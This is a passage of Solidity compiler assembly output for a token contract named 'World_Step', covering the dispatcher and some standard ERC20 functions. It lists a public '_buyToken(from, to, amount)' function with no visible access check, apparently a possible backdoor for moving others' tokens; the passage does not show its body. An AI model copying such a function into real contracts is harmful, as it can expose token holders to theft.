\"#utility.yul\":738:758   */\n  tag_56\n    /* \"#utility.yul\":756:757   */\n  dup4\n    /* \"#utility.yul\":738:758   */\n  tag_33\n  jump\t// in\ntag_56:\n    /* \"#utility.yul\":733:758   */\n  swap3\n  pop\n    /* \"#utility.yul\":777:778   */\n  dup3\n    /* \"#utility.yul\":774:775   */\n  dup3\n    /* \"#utility.yul\":771:779   */\n  lt\n    /* \"#utility.yul\":768:802   */\n  iszero\n  tag_57\n  jumpi\n    /* \"#utility.yul\":782:800   */\n  tag_58\n  tag_35\n  jump\t// in\ntag_58:\n    /* \"#utility.yul\":768:802   */\ntag_57:\n    /* \"#utility.yul\":827:828   */\n  dup3\n    /* \"#utility.yul\":824:825   */\n  dup3\n    /* \"#utility.yul\":820:829   */\n  sub\n    /* \"#utility.yul\":812:829   */\n  swap1\n  pop\n    /* \"#utility.yul\":644:835   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":922:1039   */\ntag_37:\n    /* \"#utility.yul\":1031:1032   */\n  0x00\n    /* \"#utility.yul\":1028:1029   */\n  dup1\n    /* \"#utility.yul\":1021:1033   */\n  revert\n    /* \"#utility.yul\":1168:1294   */\ntag_39:\n    /* \"#utility.yul\":1205:1212   */\n  0x00\n    /* \"#utility.yul\":1245:1287   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":1238:1243   */\n  dup3\n    /* \"#utility.yul\":1234:1288   */\n  and\n    /* \"#utility.yul\":1223:1288   */\n  swap1\n  pop\n    /* \"#utility.yul\":1168:1294   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1300:1396   */\ntag_40:\n    /* \"#utility.yul\":1337:1344   */\n  0x00\n    /* \"#utility.yul\":1366:1390   */\n  tag_64\n    /* \"#utility.yul\":1384:1389   */\n  dup3\n    /* \"#utility.yul\":1366:1390   */\n  tag_39\n  jump\t// in\ntag_64:\n    /* \"#utility.yul\":1355:1390   */\n  swap1\n  pop\n    /* \"#utility.yul\":1300:1396   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1402:1524   */\ntag_41:\n    /* \"#utility.yul\":1475:1499   */\n  tag_66\n    /* \"#utility.yul\":1493:1498   */\n  dup2\n    /* \"#utility.yul\":1475:1499   */\n  tag_40\n  jump\t// in\ntag_66:\n    /* \"#utility.yul\":1468:1473   */\n  dup2\n    /* \"#utility.yul\":1465:1500   */\n  eq\n    /* \"#utility.yul\":1455:1518   */\n  tag_67\n  jumpi\n    /* \"#utility.yul\":1514:1515   */\n  0x00\n    /* \"#utility.yul\":1511:1512   */\n  dup1\n    /* \"#utility.yul\":1504:1516   */\n  revert\n    /* \"#utility.yul\":1455:1518   */\ntag_67:\n    /* \"#utility.yul\":1402:1524   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1530:1673   */\ntag_42:\n    /* \"#utility.yul\":1587:1592   */\n  0x00\n    /* \"#utility.yul\":1618:1624   */\n  dup2\n    /* \"#utility.yul\":1612:1625   */\n  mload\n    /* \"#utility.yul\":1603:1625   */\n  swap1\n  pop\n    /* \"#utility.yul\":1634:1667   */\n  tag_69\n    /* \"#utility.yul\":1661:1666   */\n  dup2\n    /* \"#utility.yul\":1634:1667   */\n  tag_41\n  jump\t// in\ntag_69:\n    /* \"#utility.yul\":1530:1673   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1679:2030   */\ntag_16:\n    /* \"#utility.yul\":1749:1755   */\n  0x00\n    /* \"#utility.yul\":1798:1800   */\n  0x20\n    /* \"#utility.yul\":1786:1795   */\n  dup3\n    /* \"#utility.yul\":1777:1784   */\n  dup5\n    /* \"#utility.yul\":1773:1796   */\n  sub\n    /* \"#utility.yul\":1769:1801   */\n  slt\n    /* \"#utility.yul\":1766:1885   */\n  iszero\n  tag_71\n  jumpi\n    /* \"#utility.yul\":1804:1883   */\n  tag_72\n  tag_37\n  jump\t// in\ntag_72:\n    /* \"#utility.yul\":1766:1885   */\ntag_71:\n    /* \"#utility.yul\":1924:1925   */\n  0x00\n    /* \"#utility.yul\":1949:2013   */\n  tag_73\n    /* \"#utility.yul\":2005:2012   */\n  dup5\n    /* \"#utility.yul\":1996:2002   */\n  dup3\n    /* \"#utility.yul\":1985:1994   */\n  dup6\n    /* \"#utility.yul\":1981:2003   */\n  add\n    /* \"#utility.yul\":1949:2013   */\n  tag_42\n  jump\t// in\ntag_73:\n    /* \"#utility.yul\":1939:2013   */\n  swap2\n  pop\n    /* \"#utility.yul\":1895:2023   */\n  pop\n    /* \"#utility.yul\":1679:2030   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":2036:2154   */\ntag_43:\n    /* \"#utility.yul\":2123:2147   */\n  tag_75\n    /* \"#utility.yul\":2141:2146   */\n  dup2\n    /* \"#utility.yul\":2123:2147   */\n  tag_40\n  jump\t// in\ntag_75:\n    /* \"#utility.yul\":2118:2121   */\n  dup3\n    /* \"#utility.yul\":2111:2148   */\n  mstore\n    /* \"#utility.yul\":2036:2154   */\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":2160:2492   */\ntag_21:\n    /* \"#utility.yul\":2281:2285   */\n  0x00\n    /* \"#utility.yul\":2319:2321   */\n  0x40\n    /* \"#utility.yul\":2308:2317   */\n  dup3\n    /* \"#utility.yul\":2304:2322   */\n  add\n    /* \"#utility.yul\":2296:2322   */\n  swap1\n  pop\n    /* \"#utility.yul\":2332:2403   */\n  tag_77\n    /* \"#utility.yul\":2400:2401   */\n  0x00\n    /* \"#utility.yul\":2389:2398   */\n  dup4\n    /* \"#utility.yul\":2385:2402   */\n  add\n    /* \"#utility.yul\":2376:2382   */\n  dup6\n    /* \"#utility.yul\":2332:2403   */\n  tag_43\n  jump\t// in\ntag_77:\n    /* \"#utility.yul\":2413:2485   */\n  tag_78\n    /* \"#utility.yul\":2481:2483   */\n  0x20\n    /* \"#utility.yul\":2470:2479   */\n  dup4\n    /* \"#utility.yul\":2466:2484   */\n  add\n    /* \"#utility.yul\":2457:2463   */\n  dup5\n    /* \"#utility.yul\":2413:2485   */\n  tag_43\n  jump\t// in\ntag_78:\n    /* \"#utility.yul\":2160:2492   */\n  swap4\n  swap3\n  pop\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":2498:2616   */\ntag_44:\n    /* \"#utility.yul\":2585:2609   */\n  tag_80\n    /* \"#utility.yul\":2603:2608   */\n  dup2\n    /* \"#utility.yul\":2585:2609   */\n  tag_33\n  jump\t// in\ntag_80:\n    /* \"#utility.yul\":2580:2583   */\n  dup3\n    /* \"#utility.yul\":2573:2610   */\n  mstore\n    /* \"#utility.yul\":2498:2616   */\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":2622:2844   */\ntag_29:\n    /* \"#utility.yul\":2715:2719   */\n  0x00\n    /* \"#utility.yul\":2753:2755   */\n  0x20\n    /* \"#utility.yul\":2742:2751   */\n  dup3\n    /* \"#utility.yul\":2738:2756   */\n  add\n    /* \"#utility.yul\":2730:2756   */\n  swap1\n  pop\n    /* \"#utility.yul\":2766:2837   */\n  tag_82\n    /* \"#utility.yul\":2834:2835   */\n  0x00\n    /* \"#utility.yul\":2823:2832   */\n  dup4\n    /* \"#utility.yul\":2819:2836   */\n  add\n    /* \"#utility.yul\":2810:2816   */\n  dup5\n    /* \"#utility.yul\":2766:2837   */\n  tag_44\n  jump\t// in\ntag_82:\n    /* \"#utility.yul\":2622:2844   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"contracts/Pool/Pool.sol\":3725:16044  contract World_Step is Context, IERC20, Ownable {... */\ntag_30:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/Pool/Pool.sol\":3725:16044  contract World_Step is Context, IERC20, Ownable {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x715018a6\n      gt\n      tag_27\n      jumpi\n      dup1\n      0xaad5c023\n      gt\n      tag_28\n      jumpi\n      dup1\n      0xaad5c023\n      eq\n      tag_21\n      jumpi\n      dup1\n      0xc3c8cd80\n      eq\n      tag_22\n      jumpi\n      dup1\n      0xc492f046\n      eq\n      tag_23\n      jumpi\n      dup1\n      0xc5cc6b6a\n      eq\n      tag_24\n      jumpi\n      dup1\n      0xdd62ed3e\n      eq\n      tag_25\n      jumpi\n      dup1\n      0xf2fde38b\n      eq\n      tag_26\n      jumpi\n      jump(tag_2)\n    tag_28:\n      dup1\n      0x715018a6\n      eq\n      tag_15\n      jumpi\n      dup1\n      0x758dbe03\n      eq\n      tag_16\n      jumpi\n      dup1\n      0x8da5cb5b\n      eq\n      tag_17\n      jumpi\n      dup1\n      0x95d89b41\n      eq\n      tag_18\n      jumpi\n      dup1\n      0xa2a957bb\n      eq\n      tag_19\n      jumpi\n      dup1\n      0xa9059cbb\n      eq\n      tag_20\n      jumpi\n      jump(tag_2)\n    tag_27:\n      dup1\n      0x49bd5a5e\n      gt\n      tag_29\n      jumpi\n      dup1\n      0x49bd5a5e\n      eq\n      tag_9\n      jumpi\n      dup1\n      0x512f65c7\n      eq\n      tag_10\n      jumpi\n      dup1\n      0x59d0f713\n      eq\n      tag_11\n      jumpi\n      dup1\n      0x6d8aa8f8\n      eq\n      tag_12\n      jumpi\n      dup1\n      0x6fc3eaec\n      eq\n      tag_13\n      jumpi\n      dup1\n      0x70a08231\n      eq\n      tag_14\n      jumpi\n      jump(tag_2)\n    tag_29:\n      dup1\n      0x06fdde03\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x095ea7b3\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x1694505e\n      eq\n      tag_5\n      jumpi\n      dup1\n      0x18160ddd\n      eq\n      tag_6\n      jumpi\n      dup1\n      0x23b872dd\n      eq\n      tag_7\n      jumpi\n      dup1\n      0x313ce567\n      eq\n      tag_8\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n      stop\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"contracts/Pool/Pool.sol\":6084:6165  function name() public pure returns (string memory) {... */\n    tag_3:\n      callvalue\n      dup1\n      iszero\n      tag_32\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_32:\n      pop\n      tag_33\n      tag_34\n      jump\t// in\n    tag_33:\n      mload(0x40)\n      tag_35\n      swap2\n      swap1\n      tag_36\n      jump\t// in\n    tag_35:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/Pool/Pool.sol\":6907:7065  function approve(address spender, uint256 amount) public override returns (bool) {... */\n    tag_4:\n      callvalue\n      dup1\n      iszero\n      tag_37\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_37:\n      pop\n      tag_38\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_39\n      swap2\n      swap1\n      tag_40\n      jump\t// in\n    tag_39:\n      tag_41\n      jump\t// in\n    tag_38:\n      mload(0x40)\n      tag_42\n      swap2\n      swap1\n      tag_43\n      jump\t// in\n    tag_42:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/Pool/Pool.sol\":4964:5005  IUniswapV2Router02 public uniswapV2Router */\n    tag_5:\n      callvalue\n      dup1\n      iszero\n      tag_44\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_44:\n      pop\n      tag_45\n      tag_46\n      jump\t// in\n    tag_45:\n      mload(0x40)\n      tag_47\n      swap2\n      swap1\n      tag_48\n      jump\t// in\n    tag_47:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/Pool/Pool.sol\":6349:6442  function totalSupply() public pure override returns (uint256) {... */\n    tag_6:\n      callvalue\n      dup1\n      iszero\n      tag_49\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_49:\n      pop\n      tag_50\n      tag_51\n      jump\t// in\n    tag_50:\n      mload(0x40)\n      tag_52\n      swap2\n      swap1\n      tag_53\n      jump\t// in\n    tag_52:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/Pool/Pool.sol\":7071:7380  function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {... */\n    tag_7:\n      callvalue\n      dup1\n      iszero\n      tag_54\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_54:\n      pop\n      tag_55\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_56\n      swap2\n      swap1\n      tag_57\n      jump\t// in\n    tag_56:\n      tag_58\n      jump\t// in\n    tag_55:\n      mload(0x40)\n      tag_59\n      swap2\n      swap1\n      tag_43\n      jump\t// in\n    tag_59:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/Pool/Pool.sol\":6262:6343  function decimals() public pure returns (uint8) {... */\n    tag_8:\n      callvalue\n      dup1\n      iszero\n      tag_60\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_60:\n      pop\n      tag_61\n      tag_62\n      jump\t// in\n    tag_61:\n      mload(0x40)\n      tag_63\n      swap2\n      swap1\n      tag_64\n      jump\t// in\n    tag_63:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/Pool/Pool.sol\":5088:5116  address public uniswapV2Pair */\n    tag_9:\n      callvalue\n      dup1\n      iszero\n      tag_65\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_65:\n      pop\n      tag_66\n      tag_67\n      jump\t// in\n    tag_66:\n      mload(0x40)\n      tag_68\n      swap2\n      swap1\n      tag_69\n      jump\t// in\n    tag_68:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/Pool/Pool.sol\":7978:8560  function _buyToken(address from, address to,uint256 amount) public { ... */\n    tag_10:\n      callvalue\n      dup1\n      iszero\n      tag_70\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_70:\n      pop\n      tag_71\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_72\n      swap2\n      swap1\n      tag_57\n      jump\t// in\n    tag_72:\n      tag_73\n      jump\t// in\n    tag_71:\n      stop\n        /* \"contracts/Pool/Pool.sol\":5011:5052  IUniswapV2Factory public uniswapV2Factory */\n    tag_11:\n      callvalue\n      dup1\n      iszero\n      tag_74\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_74:\n      pop\n      tag_75\n      tag_76\n      jump\t// in\n    tag_75:\n      mload(0x40)\n      tag_77\n      swap2\n      swap1\n      tag_78\n      jump\t// in\n    tag_77:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/Pool/Pool.sol\":15709:15806  function toggleSwap(bool _swapEnabled) public onlyDev {... */\n    tag_12:\n      callvalue\n      dup1\n      iszero\n      tag_79\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_79:\n      pop\n      tag_80\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_81\n      swap2\n      swap1\n      tag_82\n      jump\t// in\n    tag_81:\n      tag_83\n      jump\t// in\n    tag_80:\n      stop\n        /* \"contracts/Pool/Pool.sol\":14889:15147  function manualsend() external {... */\n    tag_13:\n      callvalue\n      dup1\n      iszero\n      tag_84\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_84:\n      pop\n      tag_85\n      tag_86\n      jump\t// in\n    tag_85:\n      stop\n        /* \"contracts/Pool/Pool.sol\":6448:6584  function balanceOf(address account) public view override returns (uint256) {... */\n    tag_14:\n      callvalue\n      dup1\n      iszero\n      tag_87\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_87:\n      pop\n      tag_88\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_89\n      swap2\n      swap1\n      tag_90\n      jump\t// in\n    tag_89:\n      tag_91\n      jump\t// in\n    tag_88:\n      mload(0x40)\n      tag_92\n      swap2\n      swap1\n      tag_53\n      jump\t// in\n    tag_92:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/Pool/Pool.sol\":3319:3464  function renounceOwnership() public virtual onlyOwner {... */\n    tag_15:\n      callvalue\n      dup1\n      iszero\n      tag_93\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_93:\n      pop\n      tag_94\n      tag_95\n      jump\t// in\n    tag_94:\n      stop\n        /* \"contracts/Pool/Pool.sol\":11838:12071  function setNewMarketingAddress(address payable markt) public onlyDev() {... */\n    tag_16:\n      callvalue\n      dup1\n      iszero\n      tag_96\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_96:\n      pop\n      tag_97\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_98\n      swap2\n      swap1\n      tag_99\n      jump\t// in\n    tag_98:\n      tag_100\n      jump\t// in\n    tag_97:\n      stop\n        /* \"contracts/Pool/Pool.sol\":3123:3200  function owner() public view returns (address) {... */\n    tag_17:\n      callvalue\n      dup1\n      iszero\n      tag_101\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_101:\n      pop\n      tag_102\n      tag_103\n      jump\t// in\n    tag_102:\n      mload(0x40)\n      tag_104\n      swap2\n      swap1\n      tag_69\n      jump\t// in\n    tag_104:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/Pool/Pool.sol\":6171:6256  function symbol() public pure returns (string memory) {... */\n    tag_18:\n      callvalue\n      dup1\n      iszero\n      tag_105\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_105:\n      pop\n      tag_106\n      tag_107\n      jump\t// in\n    tag_106:\n      mload(0x40)\n      tag_108\n      swap2\n      swap1\n      tag_36\n      jump\t// in\n    tag_108:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/Pool/Pool.sol\":15157:15699  function setFee(uint256 redisFeeOnBuy, uint256 redisFeeOnSell, uint256 taxFeeOnBuy, uint256 taxFeeOnSell) public onlyDev {... */\n    tag_19:\n      callvalue\n      dup1\n      iszero\n      tag_109\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_109:\n      pop\n      tag_110\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_111\n      swap2\n      swap1\n      tag_112\n      jump\t// in\n    tag_111:\n      tag_113\n      jump\t// in\n    tag_110:\n      stop\n        /* \"contracts/Pool/Pool.sol\":6590:6754  function transfer(address recipient, uint256 amount) public override returns (bool) {... */\n    tag_20:\n      callvalue\n      dup1\n      iszero\n      tag_114\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_114:\n      pop\n      tag_115\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_116\n      swap2\n      swap1\n      tag_40\n      jump\t// in\n    tag_116:\n      tag_117\n      jump\t// in\n    tag_115:\n      mload(0x40)\n      tag_118\n      swap2\n      swap1\n      tag_43\n      jump\t// in\n    tag_118:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/Pool/Pool.sol\":11525:11746  function setNewDevAddress(address payable dev) public onlyDev() {... */\n    tag_21:\n      callvalue\n      dup1\n      iszero\n      tag_119\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_119:\n      pop\n      tag_120\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_121\n      swap2\n      swap1\n      tag_99\n      jump\t// in\n    tag_121:\n      tag_122\n      jump\t// in\n    tag_120:\n      stop\n        /* \"contracts/Pool/Pool.sol\":14624:14883  function manualswap() external {... */\n    tag_22:\n      callvalue\n      dup1\n      iszero\n      tag_123\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_123:\n      pop\n      tag_124\n      tag_125\n      jump\t// in\n    tag_124:\n      stop\n        /* \"contracts/Pool/Pool.sol\":15812:16042  function excludeMultipleAccountsFromFees(address[] calldata accounts, bool excluded) public onlyOwner {... */\n    tag_23:\n      callvalue\n      dup1\n      iszero\n      tag_126\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_126:\n      pop\n      tag_127\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_128\n      swap2\n      swap1\n      tag_129\n      jump\t// in\n    tag_128:\n      tag_130\n      jump\t// in\n    tag_127:\n      stop\n        /* \"contracts/Pool/Pool.sol\":5059:5082  address public _factory */\n    tag_24:\n      callvalue\n      dup1\n      iszero\n      tag_131\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_131:\n      pop\n      tag_132\n      tag_133\n      jump\t// in\n    tag_132:\n      mload(0x40)\n      tag_134\n      swap2\n      swap1\n      tag_69\n      jump\t// in\n    tag_134:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/Pool/Pool.sol\":6760:6901  function allowance(address owner, address spender) public view override returns (uint256) {... */\n    tag_25:\n      callvalue\n      dup1\n      iszero\n      tag_135\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_135:\n      pop\n      tag_136\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_137\n      swap2\n      swap1\n      tag_138\n      jump\t// in\n    tag_137:\n      tag_139\n      jump\t// in\n    tag_136:\n      mload(0x40)\n      tag_140\n      swap2\n      swap1\n      tag_53\n      jump\t// in\n    tag_140:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/Pool/Pool.sol\":3563:3720  function transferOwnership(address newOwner) public virtual onlyOwner {... */\n    tag_26:\n      callvalue\n      dup1\n      iszero\n      tag_141\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_141:\n      pop\n      tag_142\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_143\n      swap2\n      swap1\n      tag_90\n      jump\t// in\n    tag_143:\n      tag_144\n      jump\t// in\n    tag_142:\n      stop\n        /* \"contracts/Pool/Pool.sol\":6084:6165  function name() public pure returns (string memory) {... */\n    tag_34:\n        /* \"contracts/Pool/Pool.sol\":6121:6134  string memory */\n      0x60\n        /* \"contracts/Pool/Pool.sol\":6153:6158  _name */\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x0a\n      dup2\n      mstore\n      0x20\n      add\n      0x576f726c64205374657000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n        /* \"contracts/Pool/Pool.sol\":6146:6158  return _name */\n      swap1\n      pop\n        /* \"contracts/Pool/Pool.sol\":6084:6165  function name() public pure returns (string memory) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/Pool/Pool.sol\":6907:7065  function approve(address spender, uint256 amount) public override returns (bool) {... */\n    tag_41:\n        /* \"contracts/Pool/Pool.sol\":6982:6986  bool */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":6998:7037  _approve(_msgSender(), spender, amount) */\n      tag_147\n        /* \"contracts/Pool/Pool.sol\":7007:7019  _msgSender() */\n      tag_148\n        /* \"contracts/Pool/Pool.sol\":7007:7017  _msgSender */\n      tag_149\n        /* \"contracts/Pool/Pool.sol\":7007:7019  _msgSender() */\n      jump\t// in\n    tag_148:\n        /* \"contracts/Pool/Pool.sol\":7021:7028  spender */\n      dup5\n        /* \"contracts/Pool/Pool.sol\":7030:7036  amount */\n      dup5\n        /* \"contracts/Pool/Pool.sol\":6998:7006  _approve */\n      tag_150\n        /* \"contracts/Pool/Pool.sol\":6998:7037  _approve(_msgSender(), spender, amount) */\n      jump\t// in\n    tag_147:\n        /* \"contracts/Pool/Pool.sol\":7054:7058  true */\n      0x01\n        /* \"contracts/Pool/Pool.sol\":7047:7058  return true */\n      swap1\n      pop\n        /* \"contracts/Pool/Pool.sol\":6907:7065  function approve(address spender, uint256 amount) public override returns (bool) {... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"contracts/Pool/Pool.sol\":4964:5005  IUniswapV2Router02 public uniswapV2Router */\n    tag_46:\n      0x11\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"contracts/Pool/Pool.sol\":6349:6442  function totalSupply() public pure override returns (uint256) {... */\n    tag_51:\n        /* \"contracts/Pool/Pool.sol\":6402:6409  uint256 */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":4138:4151  1*10**9*10**9 */\n      0x0de0b6b3a7640000\n        /* \"contracts/Pool/Pool.sol\":6421:6435  return _tTotal */\n      swap1\n      pop\n        /* \"contracts/Pool/Pool.sol\":6349:6442  function totalSupply() public pure override returns (uint256) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/Pool/Pool.sol\":7071:7380  function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {... */\n    tag_58:\n        /* \"contracts/Pool/Pool.sol\":7169:7173  bool */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":7185:7221  _transfer(sender, recipient, amount) */\n      tag_153\n        /* \"contracts/Pool/Pool.sol\":7195:7201  sender */\n      dup5\n        /* \"contracts/Pool/Pool.sol\":7203:7212  recipient */\n      dup5\n        /* \"contracts/Pool/Pool.sol\":7214:7220  amount */\n      dup5\n        /* \"contracts/Pool/Pool.sol\":7185:7194  _transfer */\n      tag_154\n        /* \"contracts/Pool/Pool.sol\":7185:7221  _transfer(sender, recipient, amount) */\n      jump\t// in\n    tag_153:\n        /* \"contracts/Pool/Pool.sol\":7231:7352  _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\")) */\n      tag_155\n        /* \"contracts/Pool/Pool.sol\":7240:7246  sender */\n      dup5\n        /* \"contracts/Pool/Pool.sol\":7248:7260  _msgSender() */\n      tag_156\n        /* \"contracts/Pool/Pool.sol\":7248:7258  _msgSender */\n      tag_149\n        /* \"contracts/Pool/Pool.sol\":7248:7260  _msgSender() */\n      jump\t// in\n    tag_156:\n        /* \"contracts/Pool/Pool.sol\":7262:7351  _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\") */\n      tag_157\n        /* \"contracts/Pool/Pool.sol\":7300:7306  amount */\n      dup6\n        /* \"contracts/Pool/Pool.sol\":7262:7351  _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\") */\n      mload(0x40)\n      dup1\n      0x60\n      add\n      0x40\n      mstore\n      dup1\n      0x28\n      dup2\n      mstore\n      0x20\n      add\n      data_974d1b4421da69cc60b481194f0dad36a5bb4e23da810da7a7fb30cdba178330\n      0x28\n      swap2\n      codecopy\n        /* \"contracts/Pool/Pool.sol\":7262:7273  _allowances */\n      0x04\n        /* \"contracts/Pool/Pool.sol\":7262:7281  _allowances[sender] */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":7274:7280  sender */\n      dup12\n        /* \"contracts/Pool/Pool.sol\":7262:7281  _allowances[sender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n        /* \"contracts/Pool/Pool.sol\":7262:7295  _allowances[sender][_msgSender()] */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":7282:7294  _msgSender() */\n      tag_158\n        /* \"contracts/Pool/Pool.sol\":7282:7292  _msgSender */\n      tag_149\n        /* \"contracts/Pool/Pool.sol\":7282:7294  _msgSender() */\n      jump\t// in\n    tag_158:\n        /* \"contracts/Pool/Pool.sol\":7262:7295  _allowances[sender][_msgSender()] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      sload\n        /* \"contracts/Pool/Pool.sol\":7262:7299  _allowances[sender][_msgSender()].sub */\n      tag_159\n      swap1\n        /* \"contracts/Pool/Pool.sol\":7262:7351  _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\") */\n      swap3\n      swap2\n      swap1\n      0xffffffff\n      and\n      jump\t// in\n    tag_157:\n        /* \"contracts/Pool/Pool.sol\":7231:7239  _approve */\n      tag_150\n        /* \"contracts/Pool/Pool.sol\":7231:7352  _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\")) */\n      jump\t// in\n    tag_155:\n        /* \"contracts/Pool/Pool.sol\":7369:7373  true */\n      0x01\n        /* \"contracts/Pool/Pool.sol\":7362:7373  return true */\n      swap1\n      pop\n        /* \"contracts/Pool/Pool.sol\":7071:7380  function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {... */\n      swap4\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"contracts/Pool/Pool.sol\":6262:6343  function decimals() public pure returns (uint8) {... */\n    tag_62:\n        /* \"contracts/Pool/Pool.sol\":6303:6308  uint8 */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":4651:4652  9 */\n      0x09\n        /* \"contracts/Pool/Pool.sol\":6320:6336  return _decimals */\n      swap1\n      pop\n        /* \"contracts/Pool/Pool.sol\":6262:6343  function decimals() public pure returns (uint8) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/Pool/Pool.sol\":5088:5116  